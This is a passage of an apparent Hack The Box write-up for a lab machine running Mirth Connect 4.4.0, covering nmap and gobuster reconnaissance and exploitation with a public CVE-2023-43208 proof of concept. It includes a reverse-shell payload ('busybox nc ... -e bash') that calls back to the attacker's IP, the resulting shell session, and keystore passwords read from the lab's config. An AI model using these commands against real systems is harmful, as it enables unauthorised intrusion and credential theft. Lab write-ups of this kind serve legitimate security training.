+<span class="o">|</span>   <span class="mi">256</span> <span class="mi">07</span><span class="p">:</span><span class="n">eb</span><span class="p">:</span><span class="n">d1</span><span class="p">:</span><span class="n">b1</span><span class="p">:</span><span class="mi">61</span><span class="p">:</span><span class="mi">9</span><span class="n">a</span><span class="p">:</span><span class="mi">6</span><span class="n">f</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="n">e0</span><span class="p">:</span><span class="mi">1</span><span class="n">e</span><span class="p">:</span><span class="mi">3</span><span class="n">e</span><span class="p">:</span><span class="mi">5</span><span class="n">b</span><span class="p">:</span><span class="mi">61</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="n">b9</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">fc</span><span class="p">:</span><span class="n">d5</span><span class="p">:</span><span class="mi">7</span><span class="n">a</span><span class="p">:</span><span class="n">ca</span><span class="p">:</span><span class="mi">8</span><span class="n">c</span><span class="p">:</span><span class="mi">4</span><span class="n">f</span><span class="p">:</span><span class="n">c1</span><span class="p">:</span><span class="n">bd</span><span class="p">:</span><span class="n">c7</span><span class="p">:</span><span class="mi">2</span><span class="n">f</span><span class="p">:</span><span class="mi">3</span><span class="n">a</span><span class="p">:</span><span class="n">ef</span><span class="p">:</span><span class="n">e1</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">99</span><span class="p">:</span><span class="mi">0</span><span class="n">f</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>     <span class="n">Jetty</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Mirth</span> <span class="n">Connect</span> <span class="n">Administrator</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">favicon</span><span class="p">:</span> <span class="n">Unknown</span> <span class="n">favicon</span> <span class="n">MD5</span><span class="p">:</span> <span class="mi">62</span><span class="n">BE2608829EE4917ACB671EF40D5688</span>
+<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span>
+<span class="o">|</span>   <span class="n">Supported</span> <span class="n">Methods</span><span class="p">:</span> <span class="n">GET</span> <span class="n">HEAD</span> <span class="n">TRACE</span> <span class="n">OPTIONS</span>
+<span class="o">|</span><span class="n">_</span>  <span class="n">Potentially</span> <span class="n">risky</span> <span class="n">methods</span><span class="p">:</span> <span class="n">TRACE</span>
+<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssl</span><span class="o">/</span><span class="n">http</span> <span class="n">Jetty</span>
+<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span>
+<span class="o">|</span>   <span class="n">Supported</span> <span class="n">Methods</span><span class="p">:</span> <span class="n">GET</span> <span class="n">HEAD</span> <span class="n">TRACE</span> <span class="n">OPTIONS</span>
+<span class="o">|</span><span class="n">_</span>  <span class="n">Potentially</span> <span class="n">risky</span> <span class="n">methods</span><span class="p">:</span> <span class="n">TRACE</span>
+<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="n">TLS</span> <span class="n">randomness</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">represent</span> <span class="n">time</span>
+<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">mirth</span><span class="o">-</span><span class="n">connect</span>
+<span class="o">|</span> <span class="n">Issuer</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">Mirth</span> <span class="n">Connect</span> <span class="n">Certificate</span> <span class="n">Authority</span>
+<span class="o">|</span> <span class="n">Public</span> <span class="n">Key</span> <span class="nb">type</span><span class="p">:</span> <span class="n">rsa</span>
+<span class="o">|</span> <span class="n">Public</span> <span class="n">Key</span> <span class="n">bits</span><span class="p">:</span> <span class="mi">2048</span>
+<span class="o">|</span> <span class="n">Signature</span> <span class="n">Algorithm</span><span class="p">:</span> <span class="n">sha256WithRSAEncryption</span>
+<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">19</span><span class="n">T12</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">05</span>
+<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2075</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">19</span><span class="n">T12</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">05</span>
+<span class="o">|</span> <span class="n">MD5</span><span class="p">:</span>   <span class="n">c251</span><span class="p">:</span><span class="mi">9050</span><span class="p">:</span><span class="mi">6882</span><span class="p">:</span><span class="mi">4177</span><span class="p">:</span><span class="mi">9</span><span class="n">dbc</span><span class="p">:</span><span class="n">c609</span><span class="p">:</span><span class="n">d325</span><span class="p">:</span><span class="n">dd54</span>
+<span class="o">|</span><span class="n">_SHA</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="mi">3</span><span class="n">f2b</span><span class="p">:</span><span class="n">a7d8</span><span class="p">:</span><span class="mi">5</span><span class="n">c81</span><span class="p">:</span><span class="mi">9</span><span class="n">ecf</span><span class="p">:</span><span class="mf">6e15</span><span class="p">:</span><span class="n">cb6a</span><span class="p">:</span><span class="n">fdc6</span><span class="p">:</span><span class="n">df02</span><span class="p">:</span><span class="mi">8</span><span class="n">d9b</span><span class="p">:</span><span class="mi">1179</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Mirth</span> <span class="n">Connect</span> <span class="n">Administrator</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+</code></pre></div>
+<h3 id="findings">Findings:</h3>
+<ul>
+<li>SSH (OpenSSH 9.2p1) on port 22</li>
+<li>HTTP (Jetty)</li>
+<li>HTTPS (Jetty)</li>
+</ul>
+<h2 id="dns-configuration">DNS Configuration</h2>
+<div class="highlight"><pre><span></span><code><span class="n">echo</span> <span class="s2">&quot;10.129.1.109 interpreter.htb&quot;</span> <span class="o">|</span> <span class="n">sudo</span> <span class="n">tee</span> <span class="o">-</span><span class="n">a</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+</code></pre></div>
+<p><strong>Terminal Configuration</strong></p>
+<div class="highlight"><pre><span></span><code><span class="n">target</span><span class="o">=</span><span class="mf">10.129.1.109</span>
+<span class="n">domain</span><span class="o">=</span><span class="s1">&#39;interpreter.htb&#39;</span>
+</code></pre></div>
+<h4 id="http">HTTP</h4>
+<p><img alt="http" src="../Media/http.png" /></p>
+<p>HTTPS</p>
+<p><img alt="https" src="../Media/https.png" /></p>
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+<div class="highlight"><pre><span></span><code><span class="n">gobuster</span> <span class="nb">dir</span> <span class="o">--</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">medium</span><span class="o">-</span><span class="n">directories</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="err">$</span><span class="n">domain</span> <span class="o">-</span><span class="n">o</span> <span class="n">Output_Gobuster</span><span class="o">.</span><span class="n">txt</span>       
+<span class="o">===============================================================</span>
+<span class="n">Gobuster</span> <span class="n">v3</span><span class="mf">.8</span>
+<span class="n">by</span> <span class="n">OJ</span> <span class="n">Reeves</span> <span class="p">(</span><span class="nd">@TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">Christian</span> <span class="n">Mehlmauer</span> <span class="p">(</span><span class="nd">@firefart</span><span class="p">)</span>
+<span class="o">===============================================================</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Url</span><span class="p">:</span>                     <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">interpreter</span><span class="o">.</span><span class="n">htb</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Method</span><span class="p">:</span>                  <span class="n">GET</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Threads</span><span class="p">:</span>                 <span class="mi">10</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Wordlist</span><span class="p">:</span>                <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">medium</span><span class="o">-</span><span class="n">directories</span><span class="o">.</span><span class="n">txt</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Negative</span> <span class="n">Status</span> <span class="n">codes</span><span class="p">:</span>   <span class="mi">404</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">User</span> <span class="n">Agent</span><span class="p">:</span>              <span class="n">gobuster</span><span class="o">/</span><span class="mf">3.8</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Timeout</span><span class="p">:</span>                 <span class="mi">10</span><span class="n">s</span>
+<span class="o">===============================================================</span>
+<span class="n">Starting</span> <span class="n">gobuster</span> <span class="ow">in</span> <span class="n">directory</span> <span class="n">enumeration</span> <span class="n">mode</span>
+<span class="o">===============================================================</span>
+<span class="o">/</span><span class="n">js</span>                   <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">interpreter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="p">]</span>
+<span class="o">/</span><span class="n">images</span>               <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">interpreter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">images</span><span class="o">/</span><span class="p">]</span>
+<span class="o">/</span><span class="n">css</span>                  <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">interpreter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="p">]</span>
+<span class="o">/</span><span class="n">webadmin</span>             <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">interpreter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">webadmin</span><span class="o">/</span><span class="p">]</span>
+<span class="o">/</span><span class="n">installers</span>           <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">interpreter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">installers</span><span class="o">/</span><span class="p">]</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="n">gobuster</span> <span class="nb">dir</span> <span class="o">--</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">medium</span><span class="o">-</span><span class="n">directories</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="err">$</span><span class="n">domain</span> <span class="o">-</span><span class="n">o</span> <span class="n">Output_Gobuster_ssl</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">k</span>
+<span class="o">===============================================================</span>
+<span class="n">Gobuster</span> <span class="n">v3</span><span class="mf">.8</span>
+<span class="n">by</span> <span class="n">OJ</span> <span class="n">Reeves</span> <span class="p">(</span><span class="nd">@TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">Christian</span> <span class="n">Mehlmauer</span> <span class="p">(</span><span class="nd">@firefart</span><span class="p">)</span>
+<span class="o">===============================================================</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Url</span><span class="p">:</span>                     <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">interpreter</span><span class="o">.</span><span class="n">htb</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Method</span><span class="p">:</span>                  <span class="n">GET</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Threads</span><span class="p">:</span>                 <span class="mi">10</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Wordlist</span><span class="p">:</span>                <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">medium</span><span class="o">-</span><span class="n">directories</span><span class="o">.</span><span class="n">txt</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Negative</span> <span class="n">Status</span> <span class="n">codes</span><span class="p">:</span>   <span class="mi">404</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">User</span> <span class="n">Agent</span><span class="p">:</span>              <span class="n">gobuster</span><span class="o">/</span><span class="mf">3.8</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Timeout</span><span class="p">:</span>                 <span class="mi">10</span><span class="n">s</span>
+<span class="o">===============================================================</span>
+<span class="n">Starting</span> <span class="n">gobuster</span> <span class="ow">in</span> <span class="n">directory</span> <span class="n">enumeration</span> <span class="n">mode</span>
+<span class="o">===============================================================</span>
+<span class="o">/</span><span class="n">images</span>               <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">interpreter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">images</span><span class="o">/</span><span class="p">]</span>
+<span class="o">/</span><span class="n">js</span>                   <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">interpreter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="p">]</span>
+<span class="o">/</span><span class="n">css</span>                  <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">interpreter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="p">]</span>
+<span class="o">/</span><span class="n">api</span>                  <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">interpreter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="p">]</span>
+<span class="o">/</span><span class="n">webadmin</span>             <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">interpreter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">webadmin</span><span class="o">/</span><span class="p">]</span>
+<span class="o">/</span><span class="n">installers</span>           <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">interpreter</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">installers</span><span class="o">/</span><span class="p">]</span>
+</code></pre></div>
+<ul>
+<li>https://10.129.1.109/api/</li>
+</ul>
+<p><img alt="version" src="../Media/version.png" /></p>
+<p><strong>Mirth Connect version 4.4.0</strong></p>
+<h2 id="exploitation">Exploitation</h2>
+<p><a href="https://vsociety.medium.com/rce-in-mirth-connect-pt-i-cve-2023-37679-2452b864c166"># RCE in Mirth Connect — pt. I. (CVE-2023–37679)</a></p>
+<p><a href="https://horizon3.ai/attack-research/disclosures/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/">Writeup for CVE-2023-43208: NextGen Mirth Connect Pre-Auth RCE</a></p>
+<div class="highlight"><pre><span></span><code><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">jakabakos</span><span class="o">/</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">43208</span><span class="o">-</span><span class="n">mirth</span><span class="o">-</span><span class="n">connect</span><span class="o">-</span><span class="n">rce</span><span class="o">-</span><span class="n">poc</span><span class="o">.</span><span class="n">git</span>
+</code></pre></div>
+<p>or</p>
+<div class="highlight"><pre><span></span><code><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">K3ysTr0K3R</span><span class="o">/</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">43208</span><span class="o">-</span><span class="n">EXPLOIT</span><span class="o">.</span><span class="n">git</span>
+</code></pre></div>
+<h3 id="cve-2023-43208-mirth-connect-rce-poc">CVE-2023-43208-mirth-connect-rce-poc</h3>
+<div class="highlight"><pre><span></span><code><span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mf">43208.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="err">$</span><span class="n">domain</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;busybox nc 10.10.14.30 443 -e bash&quot;</span>
+<span class="n">The</span> <span class="n">target</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">have</span> <span class="n">executed</span> <span class="n">the</span> <span class="n">payload</span><span class="o">.</span>
+</code></pre></div>
+<h4 id="penelope-443">Penelope 443</h4>
+<div class="highlight"><pre><span></span><code><span class="n">python3</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">c</span><span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="n">cesar</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">penelope</span><span class="o">/</span><span class="n">penelope</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">p</span> <span class="mi">443</span>
+<span class="err">➤</span>  <span class="err">🏠</span> <span class="n">Main</span> <span class="n">Menu</span> <span class="p">(</span><span class="n">m</span><span class="p">)</span> <span class="err">💀</span> <span class="n">Payloads</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="err">🔄</span> <span class="n">Clear</span> <span class="p">(</span><span class="n">Ctrl</span><span class="o">-</span><span class="n">L</span><span class="p">)</span> <span class="err">🚫</span> <span class="n">Quit</span> <span class="p">(</span><span class="n">q</span><span class="o">/</span><span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span><span class="p">)</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Got</span> <span class="n">reverse</span> <span class="n">shell</span> <span class="kn">from</span> <span class="nn">interpreter</span><span class="o">~</span><span class="mf">10.129.1.109</span><span class="o">-</span><span class="n">Linux</span><span class="o">-</span><span class="n">x86_64</span> <span class="err">😍️</span> <span class="n">Assigned</span> <span class="n">SessionID</span> <span class="o">&lt;</span><span class="mi">1</span><span class="o">&gt;</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Attempting</span> <span class="n">to</span> <span class="n">upgrade</span> <span class="n">shell</span> <span class="n">to</span> <span class="n">PTY</span><span class="o">...</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Shell</span> <span class="n">upgraded</span> <span class="n">successfully</span> <span class="n">using</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span><span class="err">!</span> <span class="err">💪</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Interacting</span> <span class="k">with</span> <span class="n">session</span> <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="err">•</span> <span class="n">Shell</span> <span class="n">Type</span> <span class="n">PTY</span> <span class="err">•</span> <span class="n">Menu</span> <span class="n">key</span> <span class="n">F12</span> <span class="err">⇐</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Logging</span> <span class="n">to</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hyperc</span><span class="o">/.</span><span class="n">penelope</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">interpreter</span><span class="o">~</span><span class="mf">10.129.1.109</span><span class="o">-</span><span class="n">Linux</span><span class="o">-</span><span class="n">x86_64</span><span class="o">/</span><span class="mi">2026_02_21</span><span class="o">-</span><span class="mi">16_56_25</span><span class="o">-</span><span class="mf">611.</span><span class="n">log</span> <span class="err">📜</span>
+<span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+<span class="n">mirth</span><span class="nd">@interpreter</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">mirthconnect</span><span class="err">$</span>
+</code></pre></div>
+<h3 id="cve-2023-43208-exploit">CVE-2023-43208-EXPLOIT</h3>
+<p>If you have any conflicts, change your file to look like this:</p>
+<div class="highlight"><pre><span></span><code><span class="n">alive_progress</span><span class="o">==</span><span class="mf">3.1.4</span>
+<span class="n">packaging</span><span class="o">&gt;=</span><span class="mf">20.9</span><span class="p">,</span><span class="o">&lt;</span><span class="mf">21.0</span>
+<span class="n">pwncat</span><span class="o">-</span><span class="n">cs</span><span class="o">==</span><span class="mf">0.5.4</span>
+<span class="n">requests</span><span class="o">==</span><span class="mf">2.31.0</span>
+<span class="n">rich</span><span class="o">==</span><span class="mf">10.16.2</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mf">43208.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">interpreter</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">lh</span> <span class="mf">10.10.14.30</span> <span class="o">-</span><span class="n">lp</span> <span class="mi">4444</span>
+</code></pre></div>
+<h2 id="initial-access">Initial Access</h2>
+<div class="highlight"><pre><span></span><code><span class="n">mirth</span><span class="nd">@interpreter</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">mirthconnect</span><span class="o">/</span><span class="n">conf</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">mirthconnect</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">mirth</span><span class="o">.</span><span class="n">properties</span>
+<span class="c1"># Mirth Connect configuration file</span>
+
+<span class="c1"># directories</span>
+<span class="nb">dir</span><span class="o">.</span><span class="n">appdata</span> <span class="o">=</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">mirthconnect</span>
+<span class="nb">dir</span><span class="o">.</span><span class="n">tempdata</span> <span class="o">=</span> <span class="err">$</span><span class="p">{</span><span class="nb">dir</span><span class="o">.</span><span class="n">appdata</span><span class="p">}</span><span class="o">/</span><span class="n">temp</span>
+
+<span class="c1"># ports</span>
+<span class="n">http</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
+<span class="n">https</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="mi">443</span>
+
+<span class="c1"># password requirements</span>
+<span class="n">password</span><span class="o">.</span><span class="n">minlength</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">password</span><span class="o">.</span><span class="n">minupper</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">password</span><span class="o">.</span><span class="n">minlower</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">password</span><span class="o">.</span><span class="n">minnumeric</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">password</span><span class="o">.</span><span class="n">minspecial</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">password</span><span class="o">.</span><span class="n">retrylimit</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">password</span><span class="o">.</span><span class="n">lockoutperiod</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">password</span><span class="o">.</span><span class="n">expiration</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">password</span><span class="o">.</span><span class="n">graceperiod</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">password</span><span class="o">.</span><span class="n">reuseperiod</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">password</span><span class="o">.</span><span class="n">reuselimit</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="c1"># Only used for migration purposes, do not modify</span>
+<span class="n">version</span> <span class="o">=</span> <span class="mf">4.4.0</span>
+
+<span class="c1"># keystore</span>
+<span class="n">keystore</span><span class="o">.</span><span class="n">path</span> <span class="o">=</span> <span class="err">$</span><span class="p">{</span><span class="nb">dir</span><span class="o">.</span><span class="n">appdata</span><span class="p">}</span><span class="o">/</span><span class="n">keystore</span><span class="o">.</span><span class="n">jks</span>
+<span class="n">keystore</span><span class="o">.</span><span class="n">storepass</span> <span class="o">=</span> <span class="mi">5</span><span class="n">GbU5HGTOOgE</span>
+<span class="n">keystore</span><span class="o">.</span><span class="n">keypass</span> <span class="o">=</span> <span class="n">tAuJfQeXdnPw</span>
+<span class="n">keystore</span><span class="o">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">JCEKS</span>
+
+<span class="c1"># server</span>
+<span class="n">http</span><span class="o">.</span><span class="n">contextpath</span> <span class="o">=</span> <span class="o">/</span>
+<span class="n">server</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span>
+
+<span class="n">http</span><span class="o">.</span><span class="n">host</span> <span class="o">=</span> <span class="mf">0.0.0.0</span>
+<span class="n">https</span><span class="o">.</span><span class="n">host</span> <span class="o">=</span> <span class="mf">0.0.0.0</span>
+
+<span class="n">https</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">protocols</span> <span class="o">=</span> <span class="n">TLSv1</span><span class="mf">.3</span><span class="p">,</span><span class="n">TLSv1</span><span class="mf">.2</span>
